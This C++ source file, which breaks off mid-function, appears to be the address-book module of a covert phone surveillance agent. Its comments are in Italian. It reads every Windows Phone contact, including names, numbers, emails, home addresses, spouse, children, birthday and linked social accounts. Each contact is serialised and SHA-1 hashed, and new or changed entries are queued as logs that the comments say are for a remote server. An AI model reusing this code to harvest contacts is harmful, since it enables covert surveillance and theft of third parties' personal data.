//#include "Modules.h"
//#include "Common.h"
#include "Module.h"
#include "FunctionFunc.h"
#include "PoomCommon.h"
#include "Log.h"
#include "PoomAddressbook.h"
#include "hash.h"

// XXX Occhio che le funzioni OLE NON SONO thread safe, quindi questa classe
// non la possiamo richiamare da piu' thread contemporaneamente
CPoomAddressbook* CPoomAddressbook::m_pInstance = NULL;
volatile LONG CPoomAddressbook::lLock = 0;


CPoomAddressbook* CPoomAddressbook::self()
{
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		_Sleep(1);

	if (m_pInstance == NULL)
		m_pInstance = new(std::nothrow) CPoomAddressbook();

	InterlockedExchange((LPLONG)&lLock, 0);

	return m_pInstance;
}



void CPoomAddressbook::HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregatedPropVals, CONTACTACC* contact)
{
	SOURCEDPROPVAL* ptrS;
	CEPROPVAL* ptrPS;


	for (int i = 0; i < cAggregatedProps; i++)
    {
		ptrS=(SOURCEDPROPVAL*)rgAggregatedPropVals+i;
		SOURCE *ptrSOURCE;

		list<SOURCE> item;

		for (UINT j = 0; j < ptrS->cSources; j++)
		{
			ptrSOURCE=(SOURCE*)ptrS->rgSources+j;
			item.insert(item.begin(),*ptrSOURCE);
		}

		ptrPS=((CEPROPVAL*)ptrS->pPropVal);
	
		switch (((PIMPR_PROPS) ptrPS->propid))
        {
            case _PIMPR_JOB_TITLE:
				contact->CONTACT_PIMPR_JOB_TITLE=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_OFFICE_LOCATION:
				contact->CONTACT_PIMPR_OFFICE_LOCATION=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_YOMI_COMPANY:
				contact->CONTACT_PIMPR_YOMI_COMPANY=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_COMPANY_NAME:
				contact->CONTACT_PIMPR_COMPANY_NAME=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_EMAIL1_ADDRESS:
				contact->CONTACT_PIMPR_EMAIL1_ADDRESS=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_EMAIL2_ADDRESS:
				contact->CONTACT_PIMPR_EMAIL2_ADDRESS=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_EMAIL3_ADDRESS:
				contact->CONTACT_PIMPR_EMAIL3_ADDRESS=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_MOBILE_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER=ptrPS->val.lpwstr;	
				break;

            case _PIMPR_MOBILE2_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_BUSINESS_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
				break;

            case _PIMPR_BUSINESS2_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME2_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
					break;

            case _PIMPR_HOME_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_HOME_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_FAX_NUMBER:
				contact->CONTACT_PIMPR_BUSINESS_FAX_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_FAX_NUMBER:
				contact->CONTACT_PIMPR_HOME_FAX_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_PAGER_NUMBER:
				contact->CONTACT_PIMPR_PAGER_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_COMPANY_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_SPOUSE:
				contact->CONTACT_PIMPR_SPOUSE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_STREET:
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_STREET=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_CITY:
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_CITY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_CHILDREN:
				contact->CONTACT_PIMPR_CHILDREN=ptrPS->val.lpwstr;
                break;

            case _PIMPR_WEB_PAGE:
				contact->CONTACT_PIMPR_WEB_PAGE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_STATE:
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_STATE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_POSTAL_CODE:
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_COUNTRY:
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_STREET:
				contact->CONTACT_PIMPR_HOME_ADDRESS_STREET=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_CITY:
				contact->CONTACT_PIMPR_HOME_ADDRESS_CITY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_COUNTRY:
				contact->CONTACT_PIMPR_HOME_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_STREET:
				contact->CONTACT_PIMPR_OTHER_ADDRESS_STREET=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_CITY:
				contact->CONTACT_PIMPR_OTHER_ADDRESS_CITY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_STATE:
				contact->CONTACT_PIMPR_HOME_ADDRESS_STATE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_POSTAL_CODE:
				contact->CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_STATE:
				contact->CONTACT_PIMPR_OTHER_ADDRESS_STATE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_POSTAL_CODE:
				contact->CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_COUNTRY:
				contact->CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_FLOATING_BIRTHDAY:
            {
				FILETIME fileTime = {ptrPS->val.filetime.dwLowDateTime, ptrPS->val.filetime.dwHighDateTime};
                SYSTEMTIME lpUniversalTime,lpLocalTime;
                FileTimeToSystemTime(&fileTime, &lpUniversalTime);
				_SystemTimeToTzSpecificLocalTime(NULL,&lpUniversalTime ,&lpLocalTime);
				
				WCHAR msg[32];
				swprintf_s(msg, L"%02i/%02i/%04i",lpLocalTime.wDay,lpLocalTime.wMonth,lpLocalTime.wYear);
				wcscpy((wchar_t*)contact->CONTACT_PIMPR_FLOATING_BIRTHDAY,msg);
                break;
            }
            case _PIMPR_BODY_TEXT:
				contact->CONTACT_PIMPR_BODY_TEXT=ptrPS->val.lpwstr;
                break;
        }

	}
  


}

void CPoomAddressbook::AddSingleValuePropertyToContact(CEPROPVAL *v,CONTACTACC* contact)
{	
	 PIMPR_PROPS propid = (PIMPR_PROPS) v->propid;
    if (propid <= _PIMPR_SUFFIX)
    {
        if (propid > _PIMPR_FIRST_NAME)
        {
            switch (propid)
            {
                case _PIMPR_MIDDLE_NAME:
					contact->CompleteName.MiddleName=(LPCWSTR)v->val.lpwstr;
                    return;

                case _PIMPR_LAST_NAME:
					contact->CompleteName.LastName=(LPCWSTR)v->val.lpwstr;
                    return;

                case _PIMPR_SUFFIX:
					contact->CompleteName.Suffix=(LPCWSTR)v->val.lpwstr;
                    return;
            }
            return;
        }
        if (propid == _PIMPR_TITLE)
        {
			contact->CompleteName.Title=(LPCWSTR)v->val.lpwstr;
            return;
        }
        if (propid != _PIMPR_FIRST_NAME)
        {
            return;
        }
    }
    else
    {
        if (propid <= _PIMPR_YOMI_FIRSTNAME)
        {
            if (propid != _PIMPR_NICKNAME)
            {
                if (propid == _PIMPR_YOMI_FIRSTNAME)
                {
					contact->CompleteName.YomiFirstName=(LPCWSTR)v->val.lpwstr;
                }
                return;
            }
			contact->CompleteName.Nickname=(LPCWSTR)v->val.lpwstr;
            return;
        }
        switch (propid)
        {
            case _PIMPR_YOMI_LASTNAME:
				contact->CompleteName.YomiLastName=(LPCWSTR)v->val.lpwstr;
                return;

            case _PIMPR_IS_FAVORITE:
				contact->IsPinnedToStart=(bool)v->val.boolVal;
                return;
        }
        if (propid == _PIMPR_DISPLAY_NAME)
        {
			contact->DisplayName=(LPCWSTR)v->val.lpwstr;
        }
        return;
    }
	contact->CompleteName.FirstName=(LPCWSTR)v->val.lpwstr;

}


DWORD CPoomAddressbook::_SerializedStringLength(LPCWSTR lpString)
{
	DWORD dwStringLength = 0;

	if (lpString == NULL || wcslen(lpString) == 0)
		return 0;
	
	dwStringLength = sizeof(DWORD);
	dwStringLength += wcslen(lpString)*sizeof(WCHAR);
	
	return dwStringLength;
}

DWORD CPoomAddressbook::_Prefix(DWORD dwLength, int entryType)
{
	DWORD prefix = dwLength;
	prefix &= POOM_TYPE_MASK;    // clear type bits
	prefix |= (DWORD)entryType; 

	return prefix;

}

void CPoomAddressbook::_SerializeString(LPBYTE *lpDest, LPCWSTR lpString, int entryType)
{
	DWORD dwStringLength = 0;

	// if string is invalid, ignore and return 0 as length
	if (lpString == NULL)
		return;

	// if string length == 0, ignore and return 0 as length
	dwStringLength = wcslen(lpString) * sizeof(WCHAR); 

	if (dwStringLength == 0)
		return;

	// copy prefix and string *** WITHOUT NULL TERMINATOR ***
	DWORD prefix = _Prefix(dwStringLength, entryType << 0x18);
	CopyMemory(*lpDest, &prefix, sizeof(prefix));
	CopyMemory((*lpDest + sizeof(prefix)), lpString, dwStringLength);

	*lpDest+=(sizeof(prefix) + dwStringLength);
}




CPoomAddressbook::CPoomAddressbook():requestedCount(REQ_COUNT),m_bIsValid(FALSE),handleCount(0)
{
	err=_PoomDataServiceClient_Init();
	
	if (err==0) 
		m_bIsValid = TRUE;
}







void CPoomAddressbook::Run(UINT uAgentId)
{

	//init
	err=_PoomDataServiceClient_GetObjectsEnumerator(L"Contacts: All",&hPoom);

	//_PIMPR_ERROR_NOT_FOUND significa che ci sono 0 contatti
	if(err==_PIMPR_ERROR_NOT_FOUND||err==_PIMPR_ERROR_ACCESS_DENIED)
		 return;

	
	//Run
	err=_PoomDataServiceClient_MoveNext(hPoom,requestedCount,&handleCount,ptrArray); //in handleCount mi ritrovo il numero di contatti che ho

	contacts = (CONTACT **) ptrArray;
	CONTACT* ptrArr;
	SOURCEDPROPVAL* ptrS;
	PSOURCEDPROPVAL* ptrPS;

	ACCOUNT* ptrAcc;
	CONTACT* ptrCon;

	BYTE *pBuf = NULL;
	UINT uSize;

	
	BYTE sha1[20];
	Hash hash;


	//leggo dal markup lo sha1 dei singoli contatti dell'addressbook  e riempio la struttura
	//
	Log pPOOMMarkupRead = Log();

	//se esiste un markup lo carico
	if (pPOOMMarkupRead.IsMarkup(uAgentId)){
		// Export di tutti i dati
		//m_pInstance->_Export();
		//pPOOMMarkup.WriteMarkup(uAgentId,(BYTE *)&dwNotify, uSize);
		pBuf = pPOOMMarkupRead.ReadMarkup(uAgentId, &uSize);

		int numMarkupContact=uSize/sizeof(identifyContact);
		identifyContact* storeMarkupContact;// = new identifyContact[numMarkupContact];
		storeMarkupContact=(identifyContact*)pBuf;



		addressbookMapSha1.clear();



		for(int j=0;j<numMarkupContact;j++)
		{
			identifyContact IdSha1;
			IdSha1.ID=storeMarkupContact->ID;
			memcpy(IdSha1.sha1,storeMarkupContact->sha1,sizeof(IdSha1.sha1));
			IdSha1.sha1flag=0;
			addressbookMapSha1[storeMarkupContact->ID]=IdSha1;
			storeMarkupContact++;
		}

		//ho storato tutto in addressbookMapSha1 per cui posso liberare la memoria
		SAFE_DELETE(pBuf);
	}


													

	for(int i=0; i < handleCount; i++)
	{
#ifdef _DEBUG
		WCHAR msg[128];
		swprintf_s(msg, L">>>Numero Account=%i<<<\n",i);
		OutputDebugString(msg);
#endif

		ptrArr=contacts[i];

		//deserializzo CONTACT // CONTACTSerializer 
		CONTACTACC contact={0};
				
		for(int j=0; j<ptrArr->cProps; j++)
		{
			CEPROPVAL *ce = (CEPROPVAL *)ptrArr->rgPropVals+j; 
			CEPROPVAL *v = ce;
			AddSingleValuePropertyToContact(v,&contact);
		}
#ifdef _DEBUG
		OutputDebugString(contact.DisplayName);
#endif

		//deserializzo ACCOUNT // AccountSerializer 
		contact.NumAccount=ptrArr->cSources;
		for(int j=0; j<ptrArr->cSources&&j<MAX_NUM_ACCOUNT; j++)
		{ 
			ptrAcc=(ACCOUNT*)ptrArr->rgAccounts+j;
					
			if (ptrAcc->fIsDefaultStore != 0)
			{
				contact.NameAccountKind[j] = StorageKind::Phone;
			}
			else
			{
				contact.NameAccountKind[j] = StorageKind::Other;
			}


			for (int k = 0; k < ptrAcc->cProps; k++)
			{
				CEPROPVAL *ce = (CEPROPVAL *)ptrAcc->rgPropVals+k; 
				CEPROPVAL *v = ce;
						
				switch (v->propid)
				{
					case _PIMPR_NETWORK_SOURCE_ID:
					{
						NETWORK_SOURCE_ID ulVal = (NETWORK_SOURCE_ID) v->val.ulVal;
						if (ulVal != NETWORK_SOURCE_ID::NWindowsLive)
						{
							if (ulVal == NETWORK_SOURCE_ID::NFacebook)
							{
								goto Label_00D8;
							}
							if (ulVal == NETWORK_SOURCE_ID::NOutlook)
							{
								goto Label_00E1;
							}
						}
						else
						{
							contact.NameAccountKind[j] = StorageKind::WindowsLive;
						}
						break;
					}
					case _PIMPR_NAME:
						contact.NameAccount[j]=v->val.lpwstr;
#ifdef _DEBUG
						OutputDebugString(v->val.lpwstr);
						OutputDebugString(L":");
#endif
						break;
				}
				continue;
			Label_00D8:
				contact.NameAccountKind[j] = StorageKind::Facebook;
				continue;
			Label_00E1:
				contact.NameAccountKind[j] = StorageKind::Outlook;
			}
#ifdef _DEBUG
			switch (contact.NameAccountKind[j])
			{
				case Phone:
					OutputDebugString(L"Phone\n");
					break;
				case WindowsLive:
					OutputDebugString(L"WindowsLive\n");
					break;
				case Outlook:
					OutputDebugString(L"Outlook\n");
					break;
				case Facebook:
					OutputDebugString(L"Facebook\n");
					break;
				case Other:
					OutputDebugString(L"Other\n");
					break;
				default:
					OutputDebugString(L"default Other\n");
					break;
			}
#endif
		}

#ifdef _DEBUG				
		OutputDebugString(L"\n");
#endif
				

		HandleMultiValuedProperties(ptrArr->cAggregatedProps, ptrArr->rgAggregatedPropVals, &contact);

		//id è progressivo è sembrerebbe unico nella storia del telefono
		contact.Id=ptrArr->contactId;

#ifdef _DEBUG
		swprintf_s(msg, L">>>contact.Id=%i<<<\n",contact.Id);
		OutputDebugString(msg);
#endif

		//Se arrivo qua è perche' ho estratto tutti i dati del contatto i dall'dall'addressbook
		
		
		
		DWORD dwDynLen = 0;
		LPBYTE pPtr = NULL, lpOutBuf = NULL;
		ContactMapType* pMap = NULL;
		HeaderStruct header;
		DWORD lpdwOutLength;
				
		header.dwVersion=POOM_V2_0_PROTO;
		header.lOid=contact.Id;
		header.flags=NULL;
		header.program=0x08; //visto che non riesco a tirare fuori gli id skype pur sapendo che è un conctact skype a sto punto li considero tutti contact phone

		//calcolo la grandezza dei dati che devo passare
		lpdwOutLength = sizeof(HeaderStruct);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.FirstName);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.LastName);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_COMPANY_NAME);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_FAX_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_EMAIL1_ADDRESS);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OFFICE_LOCATION);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_PAGER_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_JOB_TITLE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_EMAIL2_ADDRESS);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_SPOUSE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_EMAIL3_ADDRESS);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_FAX_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_CHILDREN);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_WEB_PAGE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_YOMI_COMPANY);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.YomiFirstName);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.YomiLastName);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.Title);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.MiddleName);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.Suffix);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_STREET);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_CITY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_STATE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_COUNTRY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_STREET);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_CITY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STREET);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_CITY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STATE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_STATE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_FLOATING_BIRTHDAY);
		//lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BODY_TEXT);
		wstring addNotes;
		if(contact.CONTACT_PIMPR_BODY_TEXT!=NULL)
		{
			addNotes += contact.CONTACT_PIMPR_BODY_TEXT;
		}
		
		addNotes += L" { ";

		if(contact.CompleteName.Nickname!=NULL)
		{
			addNotes += L"Nickname:";
			addNotes += contact.CompleteName.Nickname;
			addNotes += L" } { ";
		}

		addNotes += L"Contact from: ";

		for (int k=0;k<contact.NumAccount;k++)
		{
			/*
			switch (contact.NameAccountKind[k])
			{
				case Phone:
					addNotes += L"Phone";
					break;
				case WindowsLive:
					addNotes += L"WindowsLive";
					break;
				case Outlook:
					addNotes += L"Outlook";
					break;
				case Facebook:
					addNotes += L"Facebook";
					break;
				case Other:
					addNotes += L"Other";
					break;
				default:
					continue;
					break;
			}
			addNotes += L":";
			*/
			addNotes += contact.NameAccount[k];
			if(k<contact.NumAccount-1) addNotes += L", ";

		}
		addNotes += L" }";
		
		lpdwOutLength += _SerializedStringLength(addNotes.c_str());

		
		header.dwSize = lpdwOutLength;
		lpOutBuf = new(std::nothrow) BYTE[lpdwOutLength];

		if (lpOutBuf == NULL)
			return;

		pPtr = lpOutBuf;

		ZeroMemory(pPtr,lpdwOutLength);
		// Copy header
		CopyMemory( pPtr, &header, sizeof(HeaderStruct));
		pPtr += sizeof(HeaderStruct);

		_SerializeString(&pPtr, contact.CompleteName.FirstName, FirstName);
		_SerializeString(&pPtr, contact.CompleteName.LastName, LastName);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_COMPANY_NAME, CompanyName);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_FAX_NUMBER, BusinessFaxNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL1_ADDRESS, Email1Address);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER, MobileTelephoneNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OFFICE_LOCATION, OfficeLocation);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_PAGER_NUMBER, PagerNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER, BusinessTelephoneNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_JOB_TITLE, JobTitle);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_TELEPHONE_NUMBER, HomeTelephoneNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL2_ADDRESS, Email2Address);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_SPOUSE, Spouse);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL3_ADDRESS, Email3Address);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER, Home2TelephoneNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_FAX_NUMBER, HomeFaxNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER, TelephoneNumbers);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_CHILDREN, Children);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_WEB_PAGE, WebPage);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER, Business2TelephoneNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER, RadioTelephoneNumber);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_YOMI_COMPANY, YomiCompanyName);
		_SerializeString(&pPtr, contact.CompleteName.YomiFirstName, YomiFirstName);
		_SerializeString(&pPtr, contact.CompleteName.YomiLastName, YomiLastName);
		_SerializeString(&pPtr, contact.CompleteName.Title, Title);
		_SerializeString(&pPtr, contact.CompleteName.MiddleName, MiddleName);
		_SerializeString(&pPtr, contact.CompleteName.Suffix, Suffix);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_STREET, HomeAddressStreet);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_CITY, HomeAddressCity);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_STATE, HomeAddressState);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE, HomeAddressPostalCode);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_COUNTRY, HomeAddressCountry);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_STREET, OtherAddressStreet);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_CITY, OtherAddressCity);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE, OtherAddressPostalCode);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY, OtherAddressCountry);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STREET, BusinessAddressStreet);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_CITY, BusinessAddressCity);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STATE, BusinessAddressState);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE, BusinessAddressPostalCode);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY, BusinessAddressCountry);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_STATE, OtherAddressState);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_FLOATING_BIRTHDAY, Birthday);
		//_SerializeString(&pPtr, contact.CONTACT_PIMPR_BODY_TEXT, Notes);
		_SerializeString(&pPtr, addNotes.c_str(), Notes);

		//se l'id del corrente contatto è presente nel markup

			//carico lo sha1 dell'id del contatto e lo confronto con quello del markup 
			//se lo sha è uguale allora il contatto non è stato modificato per cui non c'e' bisogno che creo il log x il server => sha1flag=1
			//se lo sha è diverso significa che il contatto è stato modificato per cui aggiorno il markup e creo il log x il server => sha1flag=2

		//se l'id non è presente nel markup creo il log x il server e aggiungo l'elemanto nel markup=> sha1flag=3

		//calcolo l'hash del contatto i
		hash.Sha1((UCHAR *)lpOutBuf, lpdwOutLength, sha1);
				
		identifyContact ContactFromId=addressbookMapSha1[contact.Id];
			
		BYTE bufNULL[20]={0};
		//se lo sha1 non è null entro
		if(memcmp(ContactFromId.sha1,bufNULL,sizeof(bufNULL))!=0)
		{
			if(!memcmp(ContactFromId.sha1,sha1,sizeof(sha1))==0)
			{
				//se lo sha è diverso significa che il contatto è stato modificato per cui aggiorno il markup e creo il log x il server => sha1flag=2
				//rimuovo il contatto nel il markup vecchio
				addressbookMapSha1.erase(contact.Id);


				//aggiungo il nuovo elemento nel markup e nel log per il server
				identifyContact IdSha1;
				IdSha1.ID=contact.Id;
				memcpy(IdSha1.sha1,sha1,sizeof(IdSha1.sha1));
				IdSha1.sha1flag=2;

				addressbookMapSha1[contact.Id]=IdSha1;

				Log poomLog = Log();

				if (lpOutBuf) {
					poomLog.CreateLog(LOGTYPE_ADDRESSBOOK, NULL, 0, FLASH);
					poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
					poomLog.CloseLog();
					SAFE_DELETE(lpOutBuf);
				}
			}
			else
			{
						//se lo sha è uguale allora il contatto non è stato modificato per cui non c'e' bisogno che creo il log x il server => sha1flag=1
						ContactFromId.sha1flag=1;
						addressbookMapSha1[contact.Id]=ContactFromId;

			}
				

		}
		else
		{   //se l'id non è presente nel markup creo il log x il server e aggiungo l'elemanto nel markup=> sha1flag=3

			identifyContact IdSha1;
			IdSha1.ID=contact.Id;
			memcpy(IdSha1.sha1,sha1,sizeof(IdSha1.sha1));
			IdSha1.sha1flag=3;
				
			addressbookMapSha1[contact.Id]=IdSha1;



			Log poomLog = Log();

			if (lpOutBuf) {
				poomLog.CreateLog(LOGTYPE_ADDRESSBOOK, NULL, 0, FLASH);
				poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
				poomLog.CloseLog();
				SAFE_DELETE(lpOutBuf);
			}
		}


		
	}



	//alla fine devo parsare tutti i markup è quelli contrassegnati con 0 significa che non sono piu' presenti nell'addressbook per cui li devo rimuovere dal markup
/***
	for (std::map<UINT, identifyContact>::iterator addressbookIt=addressbookMapSha1.begin(); addressbookIt != addressbookMapSha1.end(); addressbookIt++)
	{
		if(addressbookIt->second.sha1flag==0) 
		{
			//rimuovo il contatto nel il markup vecchio
			addressbookMapSha1.erase(addressbookIt->second.ID);
		}

	}
***/

	std::map<UINT, identifyContact>::iterator addressbookIt=addressbookMapSha1.begin(); 
	while(addressbookIt != addressbookMapSha1.end())
	{
		if (addressbookIt->second.sha1flag==0)
		{
			addressbookMapSha1.erase(addressbookIt++->second.ID);  // Use iterator.
									  // Note the post increment.
									  // Increments the iterator but returns the
									  // original value for use by erase 
		}
		else
		{
			++addressbookIt;           // Can use pre-increment in this case
							   // To make sure you have the efficient version
		}
	}


	
	identifyContact* storeMarkupContact = new identifyContact[addressbookMapSha1.size()];
	
	int addressbookPos=0;
	for (std::map<UINT, identifyContact>::iterator addressbookIt=addressbookMapSha1.begin(); addressbookIt != addressbookMapSha1.end(); ++addressbookIt)
	{
			storeMarkupContact[addressbookPos].ID=addressbookIt->second.ID;
			memcpy(storeMarkupContact[addressbookPos].sha1,addressbookIt->second.sha1,sizeof(storeMarkupContact[addressbookPos].sha1));
